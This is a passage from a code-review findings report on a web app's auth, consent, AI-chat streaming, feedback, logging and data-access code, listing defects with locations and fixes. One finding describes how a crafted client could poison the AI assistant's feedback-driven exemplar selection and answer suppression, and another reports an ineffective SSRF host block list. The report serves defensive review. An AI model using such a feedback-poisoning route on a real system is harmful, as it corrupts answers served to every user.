- **What breaks:** onAuthStateChange sets inflight=null on EVERY auth event (28). During bootstrap/token refresh several events fire while a getSession() is inflight; nulling inflight lets concurrent callers each start a fresh readOnce(), defeating the fan-out coalescing the module exists to provide (the '~50k round-trips saved' claim, 13-14). Separately getCachedSession returns the shared inflight promise to all callers (34,54); if the single retry also fails, that promise rejects and EVERY coalesced caller rejects together on one momentary GoTrue hiccup, rather than degrading per-caller.
- **Smallest fix:** Don't null a live inflight promise from the auth-change handler (only update the cached value); serve the last known session on transient read failure instead of rejecting every awaiter.

### [Low] isSafeExternalUrl SSRF allowlist has a dead regex — GCP *.internal hosts are never blocked  `security` (CONFIRMED)
- **Where:** src/lib/security.ts:142-170 (BLOCKED_HOST_PATTERNS entry line 153)
- **What breaks:** BLOCKED_HOST_PATTERNS includes `/^\.internal$/i` (153), intended to block GCP internal hosts. A hostname can never begin with a dot, so this pattern matches NOTHING — it is dead. isSafeExternalUrl (158-170) tests parsed.hostname against these patterns, so hosts like foo.internal or bar.c.project.internal pass as 'safe external.' Only metadata.google.internal is caught (by the separate exact-match on 152). Impact is bounded because this guard runs client-side in an SPA (real SSRF is a server concern), but it is a security control that silently does not do what it claims, and if this list is ever copied to an edge function the gap ships to the server.
- **Smallest fix:** Fix the pattern to a suffix match, e.g. `/(^|\.)internal$/i`, and add a test; keep the canonical block-list in one owned place if it is reused server-side.
- _added-in-verification_

---

## Core lib: auth & consent modules

### [High] Consent audit write can be permanently dropped for the session  `error-handling` (CONFIRMED)
- **Where:** src/components/CookieConsentBanner.tsx:118-143
- **What breaks:** persist() writes the dedupe fingerprint to sessionStorage BEFORE calling record-consent, then fires `void supabase.functions.invoke(...)` inside a try/catch that cannot catch the async rejection. If the edge write fails (offline, cold function, 5xx), the rejection is swallowed as an unhandled promise AND the fingerprint is already stored, so the identical decision is never retried this session. The GDPR Art 7(1) proof-of-consent record the module exists to guarantee is silently lost with zero recover/retry/report.
- **Smallest fix:** Await the invoke, and only set the dedupe fingerprint after a confirmed 2xx; on failure leave the fingerprint unset (so the next route change retries) and beacon the failure.
- _added-in-verification_

### [High] signOutSafe silently downgrades global revoke to local-only  `security` (CONFIRMED)
- **Where:** src/lib/auth/session-port.ts:109-120
- **What breaks:** signOutSafe defaults scope='global' and is called with security-critical reasons (mfa_refused, admin_action, session_revoked). The `await supabase.auth.signOut({scope})` sits in a try/catch with an empty body; on any network/backend hiccup it purges local storage, beacons `auth_signout` as if it succeeded, and returns void. The server-side refresh token is NEVER revoked, so the session stays alive and refreshable on other devices. A forced cross-device revocation degrades to a cosmetic local logout with no retry and no report that revocation failed.
- **Smallest fix:** For scope='global', treat a signOut throw as a real failure: retry with backoff and, if still failing, surface/queue it (e.g. beacon `global_revoke_failed` and mark the session for server-side reconciliation) instead of silently purging and reporting success.
- _added-in-verification_

### [High] Passive reconcile fabricates consent provenance (decidedAt)  `security` (PLAUSIBLE)
- **Where:** src/lib/consent/cookieyes.ts:101-118; src/components/CookieConsentBanner.tsx:178,187,234
- **What breaks:** reconcileFromCookieYes runs on mount, API poll, route change and tab-focus with `bootstrapConsent(null)` (decidedAt=null) as prev. ckyToConsentState stamps `decidedAt: prev.decidedAt ?? new Date().toISOString()`, so a merely-present cookieyes cookie causes the app to manufacture a fresh consent timestamp and POST it to record-consent as a real decision (source 'reconcile'/'backfill') that the user never actively made in this app's model, and needsBanner() then returns false. The server consent log — the thing meant to *prove* consent — gets records whose timestamp/provenance the user did not generate.
- **Smallest fix:** Only set decidedAt from an actual user action (live cookieyes event or explicit accept/reject); on passive reconcile carry prev.decidedAt through unchanged and never synthesize a timestamp for the audit write.
- _added-in-verification_

### [Medium] CookieYes→ConsentState mapping duplicated in two owners  `ownership` (CONFIRMED)
- **Where:** src/lib/consent/cookieyes.ts:101-118 vs src/components/CookieConsentBanner.tsx:98-112
- **What breaks:** The rule `analytics = !gpc && (analytics||performance)`, `marketing = !gpc && advertisement`, `functional = ...` is implemented twice: ckyToConsentState (stored/reconcile path) and fromCkyDetail (live-event path) in the component. Two copies of the same consent-derivation must be kept in sync by hand; change one (e.g. start honoring the 'other' category, or change GPC handling) and the live-event vs stored-reconcile paths silently disagree, recording different consent for the same user depending on which path fired.
- **Smallest fix:** Delete fromCkyDetail and derive a single normalized category map, then feed both the live-event detail and the stored snapshot through the one ckyToConsentState in the consent lib.
- _added-in-verification_

### [Medium] Consent recording and edge invoke live inside a UI component  `boundary` (CONFIRMED)
- **Where:** src/components/CookieConsentBanner.tsx:114-144
- **What breaks:** persist() owns the business workflow — fingerprint dedupe, saveConsent, applyConsent, and a direct `supabase.functions.invoke('record-consent', ...)` network write to the consent audit log — all inside a React component that imports the supabase client directly. Any other surface that needs to record a consent decision (a settings screen, an account-deletion flow, an SSR path) cannot reuse this; it would copy the invoke and the payload shape, creating a second writer of the consent log.
- **Smallest fix:** Move dedupe + record-consent invoke + payload assembly into a consent service (src/lib/consent/), and have the component call recordConsentDecision(state, source).
- _added-in-verification_

### [Medium] reset-telemetry sends a recovery-token-hash prefix it claims never to send  `security` (CONFIRMED)
- **Where:** src/lib/auth/reset-telemetry.ts:1-12,85
- **What breaks:** The header contract states it 'never sends tokens, emails, passwords, full URLs, or any user input,' but the payload includes `token_hash_prefix: payload.token_hash_prefix?.slice(0,24)` posted to the public, unauthenticated record-auth-recovery endpoint. A 24-char prefix of the recovery token hash is a security-sensitive, potentially correlatable value derived from the reset link; the doc/code contradiction means reviewers trust a guarantee the code violates.
- **Smallest fix:** Either drop token_hash_prefix entirely, or reduce it to a coarse non-correlatable signal (e.g. length bucket / boolean present) and correct the header comment to match what is actually transmitted.
- _added-in-verification_

### [Medium] reset-telemetry beacon and fetch paths carry different auth  `error-handling` (PLAUSIBLE)
- **Where:** src/lib/auth/reset-telemetry.ts:90-109
- **What breaks:** The preferred path, navigator.sendBeacon, cannot set headers, so it posts with NO apikey/Authorization; only the fallback fetch attaches apikey+Bearer. If record-auth-recovery enforces the Supabase apikey/gateway (the default), the beacon path 401s and the telemetry is dropped — meaning the reset-page failures this module was built to make observable are themselves silently invisible, and sendBeacon returning true (queued) hides it.
- **Smallest fix:** Ensure record-auth-recovery is genuinely public/verify_jwt=false and does not require apikey, OR stop using sendBeacon here and always use keepalive fetch with the apikey header so both paths authenticate identically.
- _added-in-verification_

### [Medium] Two-strike bad_jwt gate keyed to per-tab sessionStorage  `error-handling` (PLAUSIBLE)
- **Where:** src/lib/auth/session-health.ts:200-243
- **What breaks:** decidePurgeOnBadJwt records the first transient strike in sessionStorage, which is per-tab and not shared. After a signing-key rotation the stored token is still shape-valid and unexpired, so health='valid' and the first bad_jwt in each tab is classified 'transient, do not purge.' A user with several tabs (or one that fires only one guarded request per load) can get one strike per tab and never reach 'second_strike' within the 15s window, leaving every request failing while the code refuses to purge — the exact soft-wedge this module exists to end.
- **Smallest fix:** Store the transient-strike timestamp in localStorage (shared across tabs) or fold stored-token-exp into the decision, so a corrupt-but-unexpired token still self-heals without requiring two strikes in one tab.
- _added-in-verification_

### [Medium] Production host list duplicated across client and edge, kept in sync by hand  `ownership` (CONFIRMED)
- **Where:** src/lib/auth/production-hosts.ts:5-13
- **What breaks:** PRODUCTION_HOSTNAMES is a second copy of supabase/functions/_shared/auth-hosts.ts, with the code comment itself instructing 'Keep them in sync.' Turnstile site-key selection and redirect guards read the client copy while edge auth reads the other; they will eventually disagree (a new domain added to one), silently selecting the Turnstile test key or misrouting OAuth on the host that wasn't updated. This is the classic two-copies-kept-in-sync ownership red flag.
- **Smallest fix:** Make one the single source (generated shared constant or build-time import) so both client and edge derive the host set from the same definition.
- _added-in-verification_

### [Low] Region/geo consent logic is dead — every visitor is 'unknown'  `under-engineering` (CONFIRMED)
- **Where:** src/lib/consent/manager.ts:41-93; src/components/CookieConsentBanner.tsx:167,233
- **What breaks:** Every bootstrapConsent call passes country=null, so regionFromCountry returns 'unknown', allowNonEssential is always false, and the entire OPT_IN_COUNTRIES table plus the opt-out-defaults-on branch never execute. The direction is fail-safe, but a large geo table and region field are shipped and recorded to the consent log as permanently 'unknown', giving a false impression that geo-aware consent is implemented when no geolocation is wired in.
- **Smallest fix:** Either wire a real country source (edge geo header / IP lookup) into bootstrapConsent, or delete the unused region/OPT_IN_COUNTRIES machinery and document opt-in-everywhere as the actual policy.
- _added-in-verification_

---

## Core lib: Fleety AI modules

### [High] SSE retry logic stalls a live answer forever on any complete-but-malformed data line  `error-handling` (CONFIRMED)
- **Where:** src/lib/fleety/stream-chat.ts:141-142 (handleLine returns "retry" on JSON.parse failure) and 152-166 (inner loop restores the line and breaks without advancing)
- **What breaks:** Verified directly. handleLine is only ever called on lines already terminated by \n (line 152 slices at indexOf("\n")), i.e. COMPLETE lines. A complete `data:` line whose payload is genuinely malformed JSON (a real occurrence with LLM/edge output) hits the catch at 141 and returns "retry". The loop then does textBuffer = line + "\n" + rest (158) and breaks. The next reader.read() appends more bytes; indexOf finds the SAME newline at offset 0, handleLine re-parses the SAME bad line, returns "retry" again — indefinitely. Every token, follow-up, and the terminating [DONE] arriving after the bad line are never processed while the socket stays open. The member watches the answer freeze mid-sentence with the typing indicator spinning; it only unblocks when the whole HTTP stream closes (done=true at 148), at which point the flush block (170-175) runs handleLine on the bad line, gets "retry", the for-loop ignores it, and the line is silently dropped. Core, all-users streaming path.
- **Smallest fix:** Distinguish incomplete from malformed: only treat a fragment as retryable when it is the trailing newline-less remainder. handleLine should return "continue" (skip) for a complete line that fails to parse; handle the split-JSON case by never calling handleLine on the final newline-less remainder.

### [Medium] streamChat accepts no AbortSignal/timeout — a hung turn can never be cancelled  `error-handling` (CONFIRMED)
- **Where:** src/lib/fleety/stream-chat.ts:30-42 (StreamChatArgs has no signal), 66-79 (fetch), 146-167 (read loop)
- **What breaks:** Confirmed: StreamChatArgs defines no signal, fetch is passed none, and the reader loop has no cancellation check. If techfleet-chat hangs (cold start, model stall, half-open connection) reader.read() (147) blocks forever, the promise never settles, and onDone never fires. No caller can implement a working Stop button or client-side timeout. Combined with the retry-stall above, the module has two independent ways to wedge a member's UI with no escape short of a full page reload.
- **Smallest fix:** Add optional `signal?: AbortSignal` to StreamChatArgs, pass it to fetch, and honor signal.aborted / call reader.cancel() in the read loop so callers can cancel and impose timeouts.

### [Medium] onDone is not guaranteed on mid-stream failure — no try/finally, no error callback  `error-handling` (CONFIRMED)
- **Where:** src/lib/fleety/stream-chat.ts:86 (onTurnId fires early) and 146-177 (onDone only reached on normal fall-through; a reader.read() throw propagates past it)
- **What breaks:** Confirmed. onTurnId fires at 86, before the read loop. If reader.read() throws at 147 (network drop, reset) the exception propagates and onDone() at 177 is never called. The turn id is already set, so a caller can submit 👍/👎 against a half-streamed, truncated answer, and any 'assistant is typing' state keyed to onDone never clears unless every one of the (currently 4) call sites wrote its own finally. The lib pushes a partial-failure cleanup obligation onto every caller — exactly how one ends up wrong.
- **Smallest fix:** Wrap the streaming body in try/finally and call onDone() in finally, or add an onError callback so callers get one deterministic terminal signal on both success and failure.

### [Medium] Unbounded textBuffer growth if the server emits no newline (client-side memory DoS)  `under-engineering` (CONFIRMED)
- **Where:** src/lib/fleety/stream-chat.ts:149-152 (textBuffer += decode; inner while depends on finding \n)
- **What breaks:** Confirmed. textBuffer (117) accumulates every decoded chunk (149) and drains only when a \n is found (152). A buggy or hostile server streaming a large body with no newline — or the retry-stall above pinning a bad line at offset 0 while more bytes keep arriving — grows textBuffer without bound, consuming browser memory until the tab dies. The MAX_INPUT_LENGTH comment claims an OWASP LLM10 'unbounded-consumption guard', but that only caps OUTBOUND message length (63); the inbound stream is entirely uncapped.
- **Smallest fix:** Cap textBuffer length (abort the read and surface an error above a sane max), and fix the retry path so a stuck line cannot pin the buffer.

### [Medium] A 4th copy of the SSE contract ships while 3 inline copies stay live  `over-engineering` (CONFIRMED)
- **Where:** src/lib/fleety/stream-chat.ts:3-7 (header comment: ChatPage, FleetyChatWidget, GuidanceEmbed 'still carry their inline copies; converging them onto this module is a deliberate follow-up')
- **What breaks:** Confirmed by the module's own header. The stated purpose is ONE implementation, but it ships as a 4th copy of the SSE contract (data: framing, [DONE], fleety.followups, X-Fleety-* headers, base64 chips) rather than replacing the three. That contract now lives in four places; any change must be made and tested four times, and the stall/abort/onDone bugs above almost certainly exist in the three inline copies too. This is the 'add instead of delete / patch instead of refactor' drift the repo CLAUDE.md forbids, and the module widens it until the deferred, undated follow-up lands.
- **Smallest fix:** Land the convergence in the same change — replace the three inline copies with calls to this module — or track it as a committed, dated follow-up so the contract has a single owner.

### [Medium] Feedback writes swallow the DB error into a boolean — learning-loop signal lost silently  `error-handling` (CONFIRMED)
- **Where:** src/lib/fleety/feedback.ts:32 and 47 (return { ok: !error }; the error object is discarded)
- **What breaks:** Confirmed. submitRating (32) and submitReasons (47) drop the Supabase error and collapse it to { ok: !error }. Nothing recovers, retries, or reports — never logged, never surfaced. Per the header, these ratings drive the nightly fleety-learning-digest (thumbs-up → few-shot exemplars + canned-answer ranking; thumbs-down → auto-suppression). A silently failed write (RLS mismatch, transient network, PostgREST error) means a member's thumbs-down never reaches the digest, so a bad canned answer keeps being served to all 767 users with zero telemetry that the write failed. The catch→return-false anti-pattern the repo explicitly bans.
- **Smallest fix:** Return/log the error (report it) and have callers surface a retry affordance instead of treating {ok:false} as a normal silent outcome.

### [Medium] submitReasons uses a non-atomic UPDATE that races the rating upsert and reports success on 0 rows  `boundary` (CONFIRMED)
- **Where:** src/lib/fleety/feedback.ts:42-47 (.update({reasons}).eq(turn_id).eq(user_id))
- **What breaks:** Confirmed. The intended flow is submitRating (upsert, 29-31) THEN submitReasons (update, 42-46) on the same row. The UPDATE matches by (turn_id,user_id). If the rating upsert hasn't committed, failed, or the row never existed, the UPDATE matches zero rows — and PostgREST returns no error for a 0-row update, so line 47 returns { ok: true } while writing nothing. The member's downvote reason chips are silently discarded and the digest clusters on missing data. An ordering/idempotency assumption baked into two separate round-trips with no guarantee the first landed.
- **Smallest fix:** Make it one upsert including reasons, or verify affected-row count and return {ok:false}+report when zero rows matched; never treat a no-op update as success.

### [Medium] Feedback trusts a client-supplied turn_id with no proof the turn was served to this member — learning-loop poisoning vector  `security` (PLAUSIBLE)
- **Where:** src/lib/fleety/feedback.ts:23-33 (submitRating) and 36-48 (submitReasons); turnId originates from the client, and RLS only enforces user_id = auth.uid()
- **What breaks:** The turn id flows server-header → onTurnId → caller → submitRating(turnId,...). RLS on fleety_message_feedback only guarantees a member writes their OWN row (auth.uid()=user_id per the header comment); nothing verifies the turn_id was actually produced for this member. A crafted client can upsert rating=1 for arbitrary or guessed turn_ids and attach reason chips, and since these signals feed few-shot exemplar selection and auto-suppression across all 767 users (fleety-learning-digest), a single member can nudge which answers get promoted or suppressed globally — training-data / feedback poisoning (OWASP LLM03/LLM04). The swallowed errors (finding 6) mean even a partially-rejected poisoning attempt is invisible.
- **Smallest fix:** Bind feedback to server-verified ownership: have techfleet-chat persist turn_id↔user_id at answer time and enforce in RLS/an RPC that a rating's turn_id belongs to a turn served to auth.uid(); reject otherwise.
- _added-in-verification_

### [Low] Unvalidated free-text reasons written straight into the learning pipeline  `security` (CONFIRMED)
- **Where:** src/lib/fleety/feedback.ts:12-18 (FEEDBACK_REASONS allow-list) vs 36-47 (submitReasons accepts arbitrary string[])
- **What breaks:** Confirmed. FEEDBACK_REASONS (12-18) defines the closed chip set, but submitReasons takes an unconstrained string[] (39) and writes it verbatim to fleety_message_feedback.reasons (43). A caller bug or tampered client can write arbitrary/long/adversarial strings that the nightly digest clusters on and that influence few-shot exemplar selection / canned-answer suppression. No server-side note that values are re-validated, so untrusted client text reaches an automated answer-quality loop.
- **Smallest fix:** Reject any reason not in FEEDBACK_REASONS before writing, backed by a DB check/enum, so the digest only ever clusters on the fixed vocabulary.

### [Low] Feedback row owner (user_id) is passed by the caller instead of derived from the session  `ownership` (CONFIRMED)
- **Where:** src/lib/fleety/feedback.ts:23-27 and 36-40 (userId is a function parameter)
- **What breaks:** Confirmed. Both writers take userId as an argument (24, 38) rather than reading it from the authenticated session. RLS (auth.uid() = user_id) rejects a mismatched id, but because errors are swallowed into {ok:false} (32/47), a caller passing the wrong id gets a silent no-op with no signal the write was rejected. The owner of this fact is the session user, so the id should come from the session inside this module, not be threaded through the UI where it can be gotten wrong.
- **Smallest fix:** Read the user id from getSessionSafe()/the Supabase session inside submitRating/submitReasons and drop the userId parameter.

### [Low] Outbound messages are silently truncated at 4000 chars while the attachment bypasses the cap  `under-engineering` (CONFIRMED)
- **Where:** src/lib/fleety/stream-chat.ts:61-64 (content.slice(0, MAX_INPUT_LENGTH)) and 35/77 (attachment passed through uncapped)
- **What breaks:** Confirmed. Each message is truncated to 4000 chars at 63 with no note to the member, so a long paste is silently cut mid-sentence and the model answers the truncated version. Meanwhile attachment.text (35) — from a file up to 10MB extracted by fleety-extract — is passed straight into the request body at 77 with no length cap at all. The cited 'unbounded-consumption guard' is applied to the small field and skipped on the large one: silent and inconsistent.
- **Smallest fix:** Surface truncation to the caller (return a flag/note) instead of clipping silently, and apply a consistent size bound to attachment.text.

### [Low] streamChat emits raw sources without the dedupeSources helper that exists for exactly this  `dependency` (CONFIRMED)
- **Where:** src/lib/fleety/stream-chat.ts:101-107 (onSources with only a typeof-string filter) vs src/lib/fleety/sources.ts:33-43 (dedupeSources)
- **What breaks:** Confirmed. sources.ts exports dedupeSources (33) specifically so citations are deduped in one place across all surfaces, but streamChat passes the raw X-Fleety-Sources array to onSources (106) with only a non-string filter — no dedup. Each surface must remember to call dedupeSources itself, the exact per-surface drift the sources module was created to eliminate. A surface that forgets renders duplicate citation links.
- **Smallest fix:** Call dedupeSources on the parsed URL array inside streamChat before invoking onSources, so dedup happens once at the shared boundary.

### [Low] Domain/lib module reads and writes localStorage directly  `boundary` (CONFIRMED)
- **Where:** src/lib/fleety/modes.ts:56-72 (loadStoredMode/storeMode touch globalThis.localStorage)
- **What breaks:** Confirmed. modes.ts is shared lib code, but loadStoredMode (58) and storeMode (67) reach into localStorage — a web/UI concern the repo's dependency-direction rule keeps out of lib/domain. Guarded and best-effort so harm is low, but it couples a shared module to a browser API: it can't run or be unit-tested outside a DOM without the guard swallowing everything, and persistence policy is decided in lib rather than at the UI layer that owns view state.
- **Smallest fix:** Move mode persistence to a UI-layer hook/adapter and keep modes.ts to the pure enum/metadata/type-guard surface.

### [Low] Trailing multibyte UTF-8 and final malformed lines are silently dropped at stream end  `error-handling` (PLAUSIBLE)
- **Where:** src/lib/fleety/stream-chat.ts:146-148 (break on done, last value/decoder state never flushed) and 169-175 (flush loop discards any handleLine 'retry')
- **What breaks:** Two edge losses at termination. (1) The decoder uses {stream:true} (149) but is never flushed with a final decoder.decode() after the loop, so a multibyte character split across the last chunk boundary is dropped from the final tokens. (2) The flush block (170-175) runs handleLine on trailing lines but only acts on a 'done' result; a 'retry' (malformed/partial final line) is silently ignored, so a final content delta or an unterminated [DONE] on the last line is lost with no error. Low frequency, but it corrupts or truncates the tail of an answer with no signal.
- **Smallest fix:** Flush the decoder once after the loop and, in the flush block, treat leftover content deterministically (emit or surface an error) instead of dropping a 'retry' line.
- _added-in-verification_

---

## Core lib: validation, errors, observability & telemetry

### [High] error-reporter writes raw error messages + stacks to audit_log with ZERO redaction, despite its own docstring promising "emails are stripped"  `security` (CONFIRMED)
- **Where:** src/services/error-reporter.service.ts — reportError() line 465 builds msg via formatThrowable(err); reportToAuditLog()->writeAudit() line 349-364 passes p_error_message: truncate(args.message,...) with no redaction. The module header (lines 13-14) claims "PII safety: emails are stripped".
- **What breaks:** Nothing strips PII on the reporter path. formatThrowable() returns `name: message\nstack` verbatim, and Supabase/edge errors routinely quote user input ("user foo@bar.com not found"), while stacks embed URLs with query tokens. All of it lands in audit_log and in the agent_fix_queue error_message/fingerprint. Worse, normalizeFingerprintKey() (line 233) normalizes UUIDs/hex/numbers but NOT emails, so a per-user error with an embedded email produces a distinct fingerprint every time — dedup silently fails and each victim's address is written as a separate triage row. The redaction that exists (logger.service EMAIL_PATTERN) is never imported here.
- **Smallest fix:** Run args.message (and extraFields) through the same EMAIL_PATTERN/JWT redaction used in src/services/logger.service.ts before writeAudit(), and add email stripping to normalizeFingerprintKey() so emailed messages dedupe.

### [Medium] logger.service redacts metadata and error objects but never the free-text `message` argument  `security` (CONFIRMED)
- **Where:** src/services/logger.service.ts — makeEntry() line 141-156 stores `message` raw; emit() line 113-127 logs entry.message directly. Only metadata (redactValue) and error (formatError->redactText) are scrubbed.
- **What breaks:** Any caller doing log.error("update", `Failed to save ${email}`, {...}) writes the email/token straight to console — and the header (lines 8-10) explicitly says these logs "can later be forwarded to an external service (e.g. Sentry, LogFlare)", so the leak becomes durable the moment a transport is added. Redaction that covers two of three free-text sinks is a false sense of safety.
- **Smallest fix:** Pass `message` through redactText() inside makeEntry() the same way `error.message` already is.

### [Medium] redactValue / redactLogValue recurse with no cycle or depth guard, so circular metadata makes the logger itself throw and crash the caller  `error-handling` (CONFIRMED)
- **Where:** src/services/logger.service.ts redactValue() line 94-104; supabase/functions/_shared/logger.ts redactLogValue() line 31-52. Both recurse object/array children with no WeakSet (unlike safeSerialize in error-normalization.ts, which does guard) and no depth cap.
- **What breaks:** Pass metadata containing a circular reference — a DOM node, a React SyntheticEvent, the supabase client, an axios error — and redactValue recurses until RangeError: Maximum call stack. makeEntry() runs redactValue synchronously and is not wrapped, so the throw propagates out of log.error()/log.info() into the calling service path. A logging call must never be able to crash its caller; here it can. (Same code also flattens Date/Map/Set to {} via Object.entries, silently losing data.)
- **Smallest fix:** Add a WeakSet cycle guard and a max-depth cutoff to both redact functions, and wrap emit()/makeEntry() in try/catch so telemetry can never throw.

### [Medium] Trace correlation only survives the synchronous portion of withTrace(); any await loses it and concurrent flows clobber a single global slot  `other` (CONFIRMED)
- **Where:** src/lib/trace.ts — withTrace() line 23-32 sets one globalThis[TRACE_ID_KEY] and restores prev in a synchronous finally; getCurrentTraceId() line 35-38 reads that single slot. reportError reads it at report time (error-reporter.service.ts line 432).
- **What breaks:** The moment fn() awaits, withTrace's sync body returns and finally restores prev (usually undefined), so any async continuation — i.e. essentially every real operation — reads undefined or, worse, whatever trace id the most-recent overlapping withTrace set. The module's stated purpose (join the frontend->edge->DB chain by trace id in /admin/activity-log) does not hold for async flows, and two concurrent user operations cross-contaminate each other's trace id because they share one global variable. Audit rows get no trace id or the wrong one.
- **Smallest fix:** Thread the trace id explicitly through the async call (pass it into reportError/edge headers) or back it with an AsyncContext/zone-style store instead of a single synchronous global slot.

### [Medium] transient-error classifies serialization_failure (40001) and deadlock_detected (40P01) as pure infra_transient, permanently hiding real concurrency bugs from triage  `under-engineering` (PLAUSIBLE)
- **Where:** src/lib/transient-error.ts TRANSIENT_PG_CODES line 53-54; consumed by reportError() error-reporter.service.ts line 479-482 which forces eventType=infra_transient, severity=info (non-actionable, blocked from agent_fix_queue).
- **What breaks:** 40001/40P01 are retryable, but they are the primary signal of a hot-row / lock-ordering contention bug in the app's own writes. Routing them unconditionally to severity=info means a genuine concurrency defect that fires under load is swallowed as "infra noise" and never triaged — the failure mode is invisible precisely when it matters (peak traffic).
- **Smallest fix:** Keep them retryable, but count occurrences and escalate to an actionable event_type when the same statement/source deadlocks repeatedly, rather than dropping every one to info.

### [Medium] Over-broad transient message patterns downgrade any error whose text merely contains "timeout"/"aborted"/"Load failed" to infra_transient/info  `other` (CONFIRMED)
- **Where:** src/lib/transient-error.ts TRANSIENT_MESSAGE_PATTERNS line 17-36 (/timeout/i, /aborted/i, /Load failed/i, /NetworkError/i) matched against e.message in isTransientError() line 60-74; used to force severity=info in reportError.
- **What breaks:** Classification is substring-on-message, so a real application error like "Payment timeout reconciliation failed" or "Enrollment aborted: invalid state" is misread as infra noise, downgraded to info, and excluded from the triage queue. String matching on human-readable messages is inherently leaky and here it silently suppresses actionable bugs.
- **Smallest fix:** Gate the message-pattern branch behind a corroborating signal (network/AbortError name, transient PG code, or 5xx/0 status) instead of matching message text alone.

### [Medium] Rate-limit, dedup, and escalate-after-N state is entirely per-tab in-memory — no cross-client ceiling during a global regression  `other` (CONFIRMED)
- **Where:** src/services/error-reporter.service.ts counters/recentErrors/occurrenceTimeline are module-level Maps (line 89-97); header documents "10 reports/min/tab".
- **What breaks:** The only backpressure is per-tab. A regression that hits N users writes up to ~10 audit_log rows/min per tab x N tabs, all landing on write_audit_log and upsert_fix_queue_entry at once — a write storm on the audit path exactly during an incident, when the DB is already stressed. There is no server-side aggregate cap in this layer; the client-side dedup that would blunt it is defeated by the un-normalized-email fingerprint problem above.
- **Smallest fix:** Add a server-side per-fingerprint global rate limit inside write_audit_log/upsert_fix_queue_entry (the DB is the one place that sees all tabs), so the client cap is defense-in-depth rather than the only limit.

### [Medium] writeAudit's catch is a pure swallow with no console fallback — the entire error pipeline can go dark silently, as it already did for 7 days  `error-handling` (CONFIRMED)
- **Where:** src/services/error-reporter.service.ts writeAudit() line 388-390 (`} catch { // Telemetry must never throw. }`). Nothing in this module ever writes to console.
- **What breaks:** If write_audit_log starts rejecting — exactly the May 2026 nil-UUID incident the header describes (6 events/7d, silent) — every client error vanishes with zero local signal, in dev or prod. The catch neither recovers, retries, nor reports; it is a black hole guarding the one path whose job is visibility. There is no console.debug even in development to reveal that reporting is broken.
- **Smallest fix:** In the catch, emit a throttled console.warn (dev only, or gated) so a broken audit pipeline is observable locally instead of failing silently.

### [Low] email-domain-validation fails open and does not cache the failure, so a validator outage causes every submit to re-invoke the edge function  `error-handling` (CONFIRMED)
- **Where:** src/lib/email-domain-validation.ts line 18 (`if (error) return { valid: true };` — returns without writing domainCache); domainCache Map (line 5) is never size-bounded, only TTL-checked.
- **What breaks:** On a validate-email-domain outage the fail-open branch returns valid:true but skips the cache, so every keystroke/submit re-invokes the down function — retry amplification against an already-failing service. Separately, domainCache grows one entry per distinct domain (typos, disposable domains) with no eviction, only TTL comparison, so it leaks memory on a long-lived tab.
- **Smallest fix:** Cache the fail-open result with a short TTL to stop hammering, and cap domainCache size (LRU/prune) instead of relying on TTL alone.

---

## Core lib: data access, db, query & domain helpers

### [High] DOM translator mutates React-owned text nodes -> reconciler crash for every non-English user  `boundary` (CONFIRMED)
- **Where:** src/lib/i18n/dom-translator.ts:296-300 (setNodeValue), :150-166 (applyTranslation), :302-324 (attachObserver on document.body subtree), :84-100 (VOLATILE_ROLES guard)
- **What breaks:** attachObserver observes the entire document.body subtree and setNodeValue overwrites node.nodeValue on live React-managed text nodes whenever i18n.language!=='en'. The module's own comment (81-83) records this races React's reconciler and throws NotFoundError: removeChild (the AutosaveStatus regression). The guard only skips aria-live regions and roles status/alert/log/timer; any OTHER React-managed text node (conditionally-rendered label, list item, a button React later unmounts) can be mutated between React's diff and commit, so removeChild/insertBefore references a node whose value changed underneath it and throws — unmounting the subtree or white-screening. Fires intermittently for the entire non-English user base.
- **Smallest fix:** Stop mutating React-managed DOM: translate through React (i18n keys/provider), or restrict the observer to a data-attributed opt-in subtree React never re-renders instead of all of <body>.

### [High] Discord finalize writes profiles.avatar_url with a raw client, bypassing ProfileService sanitization/allow-list — an explicitly forbidden pattern  `security` (CONFIRMED)
- **Where:** src/lib/discord/finalize-link.ts:56-59 (supabase.from('profiles').update({ avatar_url })), :39-43 (raw profiles read); rule violated: src/components/CLAUDE.md:4
- **What breaks:** src/components/CLAUDE.md line 4 states verbatim: 'Writes to profiles go through ProfileService — never a raw supabase.from("profiles").update(...). The service owns sanitization + the mass-assignment allow-list; bypassing it is a security regression.' This helper does exactly that raw update, so avatar_url never passes deepSanitize / pickAllowedFields (ProfileService.updateFields already allow-lists avatar_url, so the sanctioned path exists and is skipped). Establishes a second sanctioned write path to the security-sensitive profiles table; any future widening or attacker-influenced URL is written unfiltered. It also appends ?t=${Date.now()} so a different string is re-stored every run, churning the row.
- **Smallest fix:** Route through ProfileService.updateFields(userId, { avatar_url }) so it inherits the allow-list + sanitization; drop the ephemeral ?t= timestamp from the persisted value.

### [High] invokeEdge transparently retries non-idempotent edge calls with no idempotency key -> duplicate side effects  `error-handling` (CONFIRMED)
- **Where:** src/lib/edge/invokeEdge.ts:127-159 (retriable branch retries on isTransientNetwork/EdgeInvokeError.retriable); compounded by src/lib/query/queryDefaults.ts:41-45 (mutation retry via isRetriable)
- **What breaks:** invokeEdge is the enforced edge path and retries once on FunctionsFetchError / network TypeError. A network error frequently means the request REACHED and mutated the server but the response was lost; the retry then writes twice. For non-idempotent functions (manage-discord-roles assign, create ticket, notification, any insert) this silently double-executes. React Query's mutation layer ALSO retries once (queryDefaults isRetriable→classify.retriable), so a mutation-through-edge can run up to 4 times. No idempotency key anywhere. Blast radius across 767 users under network flakiness: duplicate role grants, tickets, notifications.
- **Smallest fix:** Only auto-retry calls declared idempotent (opt-in, default off for mutations) or require/forward an idempotency key the edge fn dedupes on; do not stack queryDefaults' mutation retry on top of invokeEdge's retry.

### [High] React Query persister falls back to a shared 'anonymous' cache scope -> cross-user cache bleed  `security` (CONFIRMED)
- **Where:** src/lib/query/persister.ts:60-76 (readInitialUserIdFromAuthStorage returns null on parse failure), :35-40 (getPersisterKeyForUser falls back to ANONYMOUS_PERSISTER_SCOPE), :84-92 (getInnerPersister keys by activeUserId)
- **What breaks:** activeUserId at boot is derived by parsing Supabase's internal sb-*-auth-token localStorage entry (68-70). If that parse throws or yields nothing (SDK storage-shape change, corrupt/rotated token, non-standard key) it returns null and getPersisterKeyForUser silently falls back to the single shared 'anonymous' scope. On a shared browser two signed-in users then persist to and restore from the SAME anonymous snapshot, so user B hydrates user A's persisted dashboard/profile query data (PII) before the network corrects it. The isolation the file advertises evaporates on the exact failure it doesn't handle.
